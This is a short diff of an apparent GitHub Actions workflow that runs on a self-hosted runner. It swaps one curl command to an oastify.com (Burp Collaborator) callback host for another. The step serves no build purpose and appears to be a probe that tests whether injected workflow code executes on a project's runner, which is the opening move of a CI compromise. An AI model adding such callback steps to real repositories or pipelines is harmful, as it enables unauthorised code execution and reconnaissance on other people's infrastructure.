@@ -8,4 +8,4 @@ jobs:
     name: self-hosted
     runs-on: self-hosted
     steps:
-      - run: curl ksg7s656psltwyx2p1f3avpdg4mvamyb.oastify.com
+      - run: curl http://myo9y8b8vurv2034v3l5gxvfm6sxgs4h.oastify.com
